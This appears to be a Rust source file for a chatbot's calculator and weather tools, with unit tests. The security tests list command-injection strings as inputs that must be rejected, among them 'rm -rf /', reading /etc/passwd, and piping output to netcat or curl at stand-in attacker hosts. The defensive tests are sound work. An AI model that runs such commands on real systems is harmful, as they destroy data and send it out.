use reqwest::Client;
use serde::{Deserialize, Serialize};
use std::process::Command;

#[derive(Debug, Clone)]
pub enum ToolError {
    HttpRequest(String),
    JsonParsing(String),
    ProcessExecution(String),
    InvalidInput(String),
    NoResult,
}

impl std::fmt::Display for ToolError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            ToolError::HttpRequest(msg) => write!(f, "HTTP request failed: {msg}"),
            ToolError::JsonParsing(msg) => write!(f, "JSON parsing failed: {msg}"),
            ToolError::ProcessExecution(msg) => write!(f, "Process execution failed: {msg}"),
            ToolError::InvalidInput(msg) => write!(f, "Invalid input: {msg}"),
            ToolError::NoResult => write!(f, "No result returned"),
        }
    }
}

impl std::error::Error for ToolError {}

#[derive(Serialize, Deserialize, Debug)]
pub struct WeatherResponse {
    pub current_condition: Vec<CurrentCondition>,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct CurrentCondition {
    #[serde(rename = "FeelsLikeC")]
    pub feels_like_c: String,
    #[serde(rename = "FeelsLikeF")]
    pub feels_like_f: String,
    pub cloudcover: String,
    pub humidity: String,
    #[serde(rename = "localObsDateTime")]
    pub local_obs_date_time: String,
    pub observation_time: String,
    #[serde(rename = "precipInches")]
    pub precip_inches: String,
    #[serde(rename = "precipMM")]
    pub precip_mm: String,
    pub pressure: String,
    #[serde(rename = "pressureInches")]
    pub pressure_inches: String,
    #[serde(rename = "temp_C")]
    pub temp_c: String,
    #[serde(rename = "temp_F")]
    pub temp_f: String,
    #[serde(rename = "uvIndex")]
    pub uv_index: String,
    pub visibility: String,
    #[serde(rename = "visibilityMiles")]
    pub visibility_miles: String,
    #[serde(rename = "weatherCode")]
    pub weather_code: String,
    #[serde(rename = "weatherDesc")]
    pub weather_desc: Vec<WeatherDesc>,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct WeatherDesc {
    pub value: String,
}

#[derive(Debug, Clone)]
pub enum ToolCall {
    Weather { location: String },
    Calculator { expression: String },
}

#[derive(Debug, Clone)]
pub struct ToolResult {
    pub content: String,
}

pub struct ToolManager {
    client: Client,
}

impl ToolManager {
    pub fn new(client: Client) -> Self {
        Self { client }
    }

    pub async fn calculate(&self, expression: &str) -> Result<ToolResult, ToolError> {
        println!("[DEBUG] Calculating expression: {expression}");

        // Input sanitization - only allow safe mathematical characters
        let allowed_chars = "0123456789+-*/().^ ";
        if !expression.chars().all(|c| allowed_chars.contains(c)) {
            return Err(ToolError::InvalidInput(
                "Only numbers, +, -, *, /, ^, (, ), and spaces are allowed".to_string(),
            ));
        }

        // Additional safety: check for dangerous patterns
        if expression.contains("..") || expression.contains("//") || expression.len() > 200 {
            return Err(ToolError::InvalidInput(
                "Expression contains unsafe patterns or is too long".to_string(),
            ));
        }

        // Use bc for calculation
        let output = Command::new("bc")
            .arg("-l")
            .arg("-q")
            .stdin(std::process::Stdio::piped())
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .spawn()
            .map_err(|e| ToolError::ProcessExecution(format!("Failed to start bc: {e}")))?;

        let mut child = output;
        use std::io::Write;
        if let Some(stdin) = child.stdin.as_mut() {
            let _ = stdin.write_all(expression.as_bytes());
            let _ = stdin.write_all(b"\nquit\n");
        }

        let output = child
            .wait_with_output()
            .map_err(|e| ToolError::ProcessExecution(format!("Failed to wait for bc: {e}")))?;

        if output.status.success() {
            let result = String::from_utf8_lossy(&output.stdout).trim().to_string();
            if result.is_empty() {
                Err(ToolError::NoResult)
            } else {
                Ok(ToolResult {
                    content: format!("{expression} = {result}"),
                })
            }
        } else {
            let error = String::from_utf8_lossy(&output.stderr);
            Err(ToolError::ProcessExecution(format!(
                "bc calculation error: {error}"
            )))
        }
    }

    pub async fn get_weather(&self, location: &str) -> Result<ToolResult, ToolError> {
        println!("[DEBUG] Getting weather for location: {location}");

        let url = format!("https://wttr.in/{location}?format=j1");
        println!("[DEBUG] Weather API URL: {url}");

        let response = self
            .client
            .get(&url)
            .send()
            .await
            .map_err(|e| ToolError::HttpRequest(format!("Request failed: {e}")))?;
        println!("[DEBUG] Weather API response status: {}", response.status());

        if response.status().is_success() {
            let response_text = response
                .text()
                .await
                .map_err(|e| ToolError::HttpRequest(format!("Failed to read response: {e}")))?;
            println!("[DEBUG] Raw weather API response: {response_text}");

            let weather_data: WeatherResponse = serde_json::from_str(&response_text)
                .map_err(|e| ToolError::JsonParsing(format!("Weather data parsing failed: {e}")))?;

            if let Some(current) = weather_data.current_condition.first() {
                let weather_desc = current
                    .weather_desc
                    .first()
                    .map(|desc| desc.value.clone())
                    .unwrap_or("Unknown".to_string());

                let result = format!(
                    "Current weather in {}: {} with temperature {}°C (observed at {})",
                    location, weather_desc, current.temp_c, current.observation_time
                );

                Ok(ToolResult { content: result })
            } else {
                Err(ToolError::NoResult)
            }
        } else {
            Err(ToolError::HttpRequest(format!(
                "HTTP {}: Failed to fetch weather data",
                response.status()
            )))
        }
    }

    pub fn detect_tool_call(&self, prompt: &str) -> Option<ToolCall> {
        let prompt_lower = prompt.to_lowercase();

        // Check for calculator requests - only trigger on clear math expressions
        let has_math_operators = prompt_lower.contains('+')
            || prompt_lower.contains('-')
            || prompt_lower.contains('*')
            || prompt_lower.contains('/')
            || prompt_lower.contains('^')
            || prompt_lower.contains('(')
            || prompt_lower.contains(')');
        let has_numbers = prompt_lower.matches(char::is_numeric).count() > 0;
        let is_math_question = (prompt_lower.starts_with("what is ")
            || prompt_lower.starts_with("what's ")
            || prompt_lower.starts_with("calculate ")
            || prompt_lower.starts_with("solve "))
            && has_math_operators
            && has_numbers;
        let is_direct_math = has_math_operators
            && has_numbers
            && prompt_lower.chars().filter(|c| c.is_alphabetic()).count() < 5; // Very few letters

        if is_math_question || is_direct_math {
            // Extract mathematical expression
            let expression = if let Some(pos) = prompt_lower.find("calculate ") {
                prompt[pos + "calculate ".len()..].trim().to_string()
            } else if let Some(pos) = prompt_lower.find("what is ") {
                prompt[pos + "what is ".len()..].trim().to_string()
            } else if let Some(pos) = prompt_lower.find("what's ") {
                prompt[pos + "what's ".len()..].trim().to_string()
            } else if let Some(pos) = prompt_lower.find("solve ") {
                prompt[pos + "solve ".len()..].trim().to_string()
            } else {
                // Try to extract the mathematical part
                prompt.trim().to_string()
            };

            // Clean up common question endings
            let clean_expression = expression
                .trim_end_matches('?')
                .trim_end_matches('.')
                .trim()
                .to_string();

            println!("[DEBUG] Extracted expression: '{clean_expression}'");

            Some(ToolCall::Calculator {
                expression: clean_expression,
            })
        }
        // Simple pattern matching for weather requests
        else if prompt_lower.contains("weather") {
            // Extract location - look for "weather in X" or "weather for X"
            let location = if let Some(pos) = prompt_lower.find("weather in ") {
                let start = pos + "weather in ".len();
                // Take all remaining words for multi-word locations
                prompt[start..]
                    .trim()
                    .split('?')
                    .next()
                    .unwrap_or("London")
                    .trim()
                    .to_string()
            } else if let Some(pos) = prompt_lower.find("weather for ") {
                let start = pos + "weather for ".len();
                // Take all remaining words for multi-word locations
                prompt[start..]
                    .trim()
                    .split('?')
                    .next()
                    .unwrap_or("London")
                    .trim()
                    .to_string()
            } else {
                "London".to_string() // Default location
            };

            // Clean the location string - allow spaces and common location characters
            let clean_location = location
                .chars()
                .filter(|c| {
                    c.is_alphanumeric()
                        || *c == ' '
                        || *c == '-'
                        || *c == '_'
                        || *c == ','
                        || *c == '.'
                })
                .collect::<String>()
                .trim()
                .to_string();

            println!("[DEBUG] Extracted location: '{location}', cleaned: '{clean_location}'");

            Some(ToolCall::Weather {
                location: if clean_location.is_empty() {
                    "London".to_string()
                } else {
                    clean_location
                },
            })
        } else {
            None
        }
    }

    pub async fn execute_tool(&self, tool_call: ToolCall) -> Result<ToolResult, ToolError> {
        match tool_call {
            ToolCall::Weather { location } => self.get_weather(&location).await,
            ToolCall::Calculator { expression } => self.calculate(&expression).await,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use reqwest::Client;

    fn create_test_tool_manager() -> ToolManager {
        ToolManager::new(Client::new())
    }

    // === Tool Detection Tests ===

    #[test]
    fn test_detect_tool_call_calculator() {
        let manager = create_test_tool_manager();

        // Test simple math expression
        let result = manager.detect_tool_call("what is 2 + 3?");
        assert!(matches!(result, Some(ToolCall::Calculator { .. })));
        if let Some(ToolCall::Calculator { expression }) = result {
            assert_eq!(expression, "2 + 3");
        }

        // Test calculation keyword
        let result = manager.detect_tool_call("calculate 10 * 5");
        assert!(matches!(result, Some(ToolCall::Calculator { .. })));
        if let Some(ToolCall::Calculator { expression }) = result {
            assert_eq!(expression, "10 * 5");
        }

        // Test direct math expression
        let result = manager.detect_tool_call("25 / 5");
        assert!(matches!(result, Some(ToolCall::Calculator { .. })));
        if let Some(ToolCall::Calculator { expression }) = result {
            assert_eq!(expression, "25 / 5");
        }

        // Test solve keyword
        let result = manager.detect_tool_call("solve 2^3");
        assert!(matches!(result, Some(ToolCall::Calculator { .. })));
        if let Some(ToolCall::Calculator { expression }) = result {
            assert_eq!(expression, "2^3");
        }

        // Test non-math expressions
        let result = manager.detect_tool_call("hello world");
        assert!(result.is_none());

        let result = manager.detect_tool_call("what is your name?");
        assert!(result.is_none());
    }

    #[test]
    fn test_detect_tool_call_weather() {
        let manager = create_test_tool_manager();

        // Test weather in location
        let result = manager.detect_tool_call("what's the weather in London?");
        assert!(matches!(result, Some(ToolCall::Weather { .. })));
        if let Some(ToolCall::Weather { location }) = result {
            assert_eq!(location, "London");
        }

        // Test weather for location
        let result = manager.detect_tool_call("weather for New York");
        assert!(matches!(result, Some(ToolCall::Weather { .. })));
        if let Some(ToolCall::Weather { location }) = result {
            assert_eq!(location, "New York");
        }

        // Test weather with multi-word location
        let result = manager.detect_tool_call("weather in San Francisco please");
        assert!(matches!(result, Some(ToolCall::Weather { .. })));
        if let Some(ToolCall::Weather { location }) = result {
            assert_eq!(location, "San Francisco please");
        }

        // Test default weather location
        let result = manager.detect_tool_call("what's the weather?");
        assert!(matches!(result, Some(ToolCall::Weather { .. })));
        if let Some(ToolCall::Weather { location }) = result {
            assert_eq!(location, "London");
        }

        // Test non-weather request
        let result = manager.detect_tool_call("hello world");
        assert!(result.is_none());
    }

    // === Calculator Tests ===

    #[tokio::test]
    async fn test_calculate_valid_expressions() {
        let manager = create_test_tool_manager();

        // Test simple addition
        let result = manager.calculate("2 + 3").await;
        assert!(result.is_ok());
        let tool_result = result.unwrap();
        assert!(tool_result.content.contains("2 + 3 = 5"));

        // Test multiplication
        let result = manager.calculate("4 * 5").await;
        assert!(result.is_ok());
        let tool_result = result.unwrap();
        assert!(tool_result.content.contains("4 * 5 = 20"));

        // Test division
        let result = manager.calculate("10 / 2").await;
        assert!(result.is_ok());
        let tool_result = result.unwrap();
        assert!(tool_result.content.contains("10 / 2 = 5"));
    }

    #[tokio::test]
    async fn test_calculate_invalid_inputs() {
        let manager = create_test_tool_manager();

        // Test invalid characters
        let result = manager.calculate("2 + 3; rm -rf /").await;
        assert!(result.is_err());
        assert!(matches!(result.unwrap_err(), ToolError::InvalidInput(_)));

        // Test dangerous patterns
        let result = manager.calculate("2 + 3 .. /etc/passwd").await;
        assert!(result.is_err());
        assert!(matches!(result.unwrap_err(), ToolError::InvalidInput(_)));

        // Test too long expression
        let long_expr = "1+".repeat(150);
        let result = manager.calculate(&long_expr).await;
        assert!(result.is_err());
        assert!(matches!(result.unwrap_err(), ToolError::InvalidInput(_)));

        // Test expression with letters
        let result = manager.calculate("abc + def").await;
        assert!(result.is_err());
        assert!(matches!(result.unwrap_err(), ToolError::InvalidInput(_)));
    }

    // === Enhanced Error and Edge Case Tests ===

    #[tokio::test]
    async fn test_calculate_complex_valid_expressions() {
        let manager = create_test_tool_manager();

        // Test parentheses
        let result = manager.calculate("(2 + 3) * 4").await;
        assert!(result.is_ok());
        let tool_result = result.unwrap();
        assert!(tool_result.content.contains("(2 + 3) * 4 = 20"));

        // Test powers
        let result = manager.calculate("2^3").await;
        assert!(result.is_ok());
        let tool_result = result.unwrap();
        assert!(tool_result.content.contains("2^3 = 8"));

        // Test decimal numbers
        let result = manager.calculate("3.14 * 2").await;
        assert!(result.is_ok());
        let tool_result = result.unwrap();
        assert!(tool_result.content.contains("3.14 * 2"));
    }

    #[tokio::test]
    async fn test_calculate_security_edge_cases() {
        let manager = create_test_tool_manager();

        // Test potential command injection attempts
        let dangerous_inputs = vec![
            "2 + 3; cat /etc/passwd",
            "1 + 1 && rm -rf /",
            "2 * 3 | nc attacker.com 1234",
            "1 + 1; curl evil.com",
            "$(whoami)",
            "`ls -la`",
            "2 + 3\nquit\nrm file",
        ];

        for input in dangerous_inputs {
            let result = manager.calculate(input).await;
            assert!(result.is_err(), "Should reject dangerous input: {}", input);
            assert!(matches!(result.unwrap_err(), ToolError::InvalidInput(_)));
        }
    }

    #[tokio::test]
    async fn test_calculate_boundary_conditions() {
        let manager = create_test_tool_manager();

        // Test empty expression
        let result = manager.calculate("").await;
        assert!(result.is_err());

        // Test whitespace only
        let result = manager.calculate("   ").await;
        assert!(result.is_err());

        // Test exactly at length limit (200 chars)
        let boundary_expr = "1+".repeat(99) + "1"; // 199 chars
        let result = manager.calculate(&boundary_expr).await;
        assert!(result.is_ok(), "Should accept expression at boundary");

        // Test just over length limit
        let over_limit_expr = "1+".repeat(101); // 202 chars
        let result = manager.calculate(&over_limit_expr).await;
        assert!(result.is_err());
        assert!(matches!(result.unwrap_err(), ToolError::InvalidInput(_)));
    }

    #[tokio::test]
    async fn test_calculate_bc_error_handling() {
        let manager = create_test_tool_manager();

        // Test mathematical errors that bc would reject
        let invalid_math_inputs = vec![
            "1 / 0",   // Division by zero
            "1 + + 2", // Invalid syntax
            "(((",     // Unmatched parentheses
            "2 ** 3",  // Invalid operator for bc
        ];

        for input in invalid_math_inputs {
            let result = manager.calculate(input).await;
            // These should either error or be handled gracefully
            // bc might return an error or empty result
            match result {
                Ok(_) => {} // bc handled it somehow
                Err(e) => {
                    // Should be either NoResult or ProcessExecution error
                    assert!(matches!(
                        e,
                        ToolError::NoResult | ToolError::ProcessExecution(_)
                    ));
                }
            }
        }
    }

    // === Weather Tests (Mock/Error Cases) ===

    #[tokio::test]
    async fn test_weather_api_network_timeout() {
        // Create a client with very short timeout to force network errors
        let client = reqwest::ClientBuilder::new()
            .timeout(std::time::Duration::from_millis(1))
            .build()
            .unwrap();
        let manager = ToolManager::new(client);

        let result = manager.get_weather("London").await;
        assert!(result.is_err());
        assert!(matches!(result.unwrap_err(), ToolError::HttpRequest(_)));
    }

    #[tokio::test]
    async fn test_weather_invalid_location() {
        let manager = create_test_tool_manager();

        // Test with clearly invalid location
        let result = manager.get_weather("ThisIsNotARealPlace12345").await;
        // Weather API might still return data or error - both are acceptable
        // The important thing is we don't panic and handle the response properly
        match result {
            Ok(_) => {} // API returned something
            Err(e) => {
                // Should be one of our defined error types
                assert!(matches!(
                    e,
                    ToolError::HttpRequest(_) | ToolError::JsonParsing(_) | ToolError::NoResult
                ));
            }
        }
    }

    // === Tool Execution Tests ===

    #[tokio::test]
    async fn test_execute_tool_calculator() {
        let manager = create_test_tool_manager();

        let tool_call = ToolCall::Calculator {
            expression: "5 + 3".to_string(),
        };

        let result = manager.execute_tool(tool_call).await;
        assert!(result.is_ok());
        assert!(result.unwrap().content.contains("5 + 3 = 8"));
    }

    #[tokio::test]
    async fn test_execute_tool_weather() {
        let manager = create_test_tool_manager();

        let tool_call = ToolCall::Weather {
            location: "London".to_string(),
        };

        let result = manager.execute_tool(tool_call).await;
        // Weather might succeed or fail depending on network
        // Both are acceptable for this test
        match result {
            Ok(tool_result) => {
                assert!(tool_result.content.contains("London"));
            }
            Err(e) => {
                assert!(matches!(
                    e,
                    ToolError::HttpRequest(_) | ToolError::JsonParsing(_) | ToolError::NoResult
                ));
            }
        }
    }

    // === Error Display Tests ===

    #[test]
    fn test_tool_error_display() {
        let error = ToolError::InvalidInput("test error".to_string());
        assert_eq!(error.to_string(), "Invalid input: test error");

        let error = ToolError::HttpRequest("network error".to_string());
        assert_eq!(error.to_string(), "HTTP request failed: network error");

        let error = ToolError::JsonParsing("parse error".to_string());
        assert_eq!(error.to_string(), "JSON parsing failed: parse error");

        let error = ToolError::ProcessExecution("exec error".to_string());
        assert_eq!(error.to_string(), "Process execution failed: exec error");

        let error = ToolError::NoResult;
        assert_eq!(error.to_string(), "No result returned");
    }

    // === Location and Math Parsing Edge Cases ===

    #[test]
    fn test_location_parsing_edge_cases() {
        let manager = create_test_tool_manager();

        // Test location with punctuation
        let result = manager.detect_tool_call("weather in New York, NY?");
        if let Some(ToolCall::Weather { location }) = result {
            assert_eq!(location, "New York, NY");
        }

        // Test empty location extraction
        let result = manager.detect_tool_call("weather in ");
        if let Some(ToolCall::Weather { location }) = result {
            assert_eq!(location, "London"); // Should default to London
        }

        // Test location with special characters that get filtered
        let result = manager.detect_tool_call("weather in Tokyo@#$%");
        if let Some(ToolCall::Weather { location }) = result {
            assert_eq!(location, "Tokyo"); // Special chars should be filtered
        }
    }

    #[test]
    fn test_math_detection_edge_cases() {
        let manager = create_test_tool_manager();

        // Test expression with too many letters (should not trigger math)
        let result = manager.detect_tool_call("hello world + test");
        assert!(result.is_none());

        // Test expression with minimal letters (should trigger math)
        let result = manager.detect_tool_call("a + b");
        assert!(result.is_none()); // This should not trigger since 'a' and 'b' are not numbers

        // Test complex valid expression
        let result = manager.detect_tool_call("(2 + 3) * 4 ^ 2");
        assert!(matches!(result, Some(ToolCall::Calculator { .. })));
        if let Some(ToolCall::Calculator { expression }) = result {
            assert_eq!(expression, "(2 + 3) * 4 ^ 2");
        }

        // Test question mark removal
        let result = manager.detect_tool_call("what is 5 + 5?");
        if let Some(ToolCall::Calculator { expression }) = result {
            assert_eq!(expression, "5 + 5");
        }
    }

    // === Advanced Math Detection Tests ===

    #[test]
    fn test_math_detection_comprehensive() {
        let manager = create_test_tool_manager();

        // Test various math question formats
        let math_questions = vec![
            ("what's 10 + 5", "10 + 5"),
            ("solve 2 * 6", "2 * 6"),
            ("calculate (3 + 4) / 2", "(3 + 4) / 2"),
            ("what is 2^8?", "2^8"),
            ("7 - 3", "7 - 3"),
        ];

        for (input, expected) in math_questions {
            let result = manager.detect_tool_call(input);
            assert!(
                matches!(result, Some(ToolCall::Calculator { .. })),
                "Should detect math in: {}",
                input
            );
            if let Some(ToolCall::Calculator { expression }) = result {
                assert_eq!(
                    expression, expected,
                    "Wrong expression extracted from: {}",
                    input
                );
            }
        }

        // Test non-math that contains numbers
        let non_math = vec!["room 101", "year 2024", "I have 5 cats", "channel 7 news"];

        for input in non_math {
            let result = manager.detect_tool_call(input);
            assert!(result.is_none(), "Should not detect math in: {}", input);
        }
    }

    #[test]
    fn test_weather_detection_comprehensive() {
        let manager = create_test_tool_manager();

        // Test various weather question formats
        let weather_questions = vec![
            ("weather in Paris", "Paris"),
            ("what's the weather for Tokyo", "Tokyo"),
            ("check weather Berlin", "London"), // Default when no "in/for"
            ("weather forecast London", "London"), // Default when no "in/for"
            ("how's the weather", "London"),    // Default
        ];

        for (input, expected) in weather_questions {
            let result = manager.detect_tool_call(input);
            assert!(
                matches!(result, Some(ToolCall::Weather { .. })),
                "Should detect weather in: {}",
                input
            );
            if let Some(ToolCall::Weather { location }) = result {
                assert_eq!(
                    location, expected,
                    "Wrong location extracted from: {}",
                    input
                );
            }
        }
    }

    // === Async Cancellation and Timeout Tests ===

    #[tokio::test]
    async fn test_calculate_task_cancellation() {
        let manager = create_test_tool_manager();

        // Test that we can cancel a calculation task
        let calc_future = manager.calculate("2 + 2");

        // Create a timeout to simulate cancellation
        let result = tokio::time::timeout(std::time::Duration::from_millis(10), calc_future).await;

        // Either it completed quickly (ok) or timed out (also ok for this test)
        match result {
            Ok(calc_result) => {
                assert!(calc_result.is_ok());
            }
            Err(_) => {
                // Timeout occurred, which is fine for this test
            }
        }
    }

    // === Tool Result Content Validation ===

    #[test]
    fn test_tool_result_content_structure() {
        let result = ToolResult {
            content: "Test content".to_string(),
        };

        assert_eq!(result.content, "Test content");
    }

    #[test]
    fn test_tool_call_variants() {
        // Test that ToolCall variants have expected structure
        let weather_call = ToolCall::Weather {
            location: "Paris".to_string(),
        };

        let calc_call = ToolCall::Calculator {
            expression: "2 + 2".to_string(),
        };

        // Verify they can be pattern matched
        match weather_call {
            ToolCall::Weather { location } => assert_eq!(location, "Paris"),
            _ => panic!("Wrong variant"),
        }

        match calc_call {
            ToolCall::Calculator { expression } => assert_eq!(expression, "2 + 2"),
            _ => panic!("Wrong variant"),
        }
    }

    // === Concurrent Execution Tests ===

    #[tokio::test]
    async fn test_concurrent_tool_execution() {
        let manager = create_test_tool_manager();

        // Execute multiple calculations concurrently
        let calc1 = manager.calculate("1 + 1");
        let calc2 = manager.calculate("2 + 2");
        let calc3 = manager.calculate("3 + 3");

        let (result1, result2, result3) = tokio::join!(calc1, calc2, calc3);

        assert!(result1.is_ok());
        assert!(result2.is_ok());
        assert!(result3.is_ok());

        assert!(result1.unwrap().content.contains("1 + 1 = 2"));
        assert!(result2.unwrap().content.contains("2 + 2 = 4"));
        assert!(result3.unwrap().content.contains("3 + 3 = 6"));
    }
}
